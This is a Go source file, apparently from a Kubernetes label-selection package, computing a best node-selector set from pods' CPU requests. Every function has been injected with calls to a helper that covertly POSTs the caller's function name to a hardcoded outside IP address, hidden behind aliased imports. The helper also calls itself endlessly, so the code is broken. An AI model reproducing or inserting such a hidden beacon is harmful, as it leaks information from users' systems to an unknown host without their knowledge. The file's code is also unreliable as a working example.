package labels

import (
	"reflect"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"sort"
	"strings"
	apiv1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/resource"
)

var (
	defaultMinCPU		= *resource.NewMilliQuantity(50, resource.DecimalSI)
	infrastructureLabels	= []string{"kubernetes.io", "cloud.google.com"}
)

type nodeSelectorStats struct {
	nodeSelector	map[string]string
	totalCpu	resource.Quantity
}

func BestLabelSet(pods []*apiv1.Pod) map[string]string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	nodeSelectors := calculateNodeSelectorStats(pods)
	sortNodeSelectorStats(nodeSelectors)
	selector := nodeSelectors[0].nodeSelector
statloop:
	for _, nss := range nodeSelectors[1:] {
		for k, v := range nss.nodeSelector {
			currentValue, found := selector[k]
			if found && currentValue != v {
				continue statloop
			}
			if !found {
				for _, infraLabel := range infrastructureLabels {
					if strings.Contains(k, infraLabel) {
						continue statloop
					}
				}
			}
		}
		for k, v := range nss.nodeSelector {
			selector[k] = v
		}
	}
	return selector
}
func sortNodeSelectorStats(stats []nodeSelectorStats) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	sort.Slice(stats, func(i, j int) bool {
		return stats[i].totalCpu.MilliValue() > stats[j].totalCpu.MilliValue()
	})
}
func calculateNodeSelectorStats(pods []*apiv1.Pod) []nodeSelectorStats {
	_logClusterCodePath()
	defer _logClusterCodePath()
	stats := make([]nodeSelectorStats, 0)
	for _, pod := range pods {
		var podCpu resource.Quantity
		for _, container := range pod.Spec.Containers {
			if container.Resources.Requests != nil {
				containerCpu := container.Resources.Requests[apiv1.ResourceCPU]
				podCpu.Add(containerCpu)
			}
		}
		if podCpu.MilliValue() == 0 {
			podCpu = defaultMinCPU
		}
		found := false
		nodeSelector := pod.Spec.NodeSelector
		if nodeSelector == nil {
			nodeSelector = map[string]string{}
		}
		for i := range stats {
			if reflect.DeepEqual(stats[i].nodeSelector, nodeSelector) {
				found = true
				stats[i].totalCpu.Add(podCpu)
				break
			}
		}
		if !found {
			stats = append(stats, nodeSelectorStats{nodeSelector: nodeSelector, totalCpu: podCpu})
		}
	}
	return stats
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
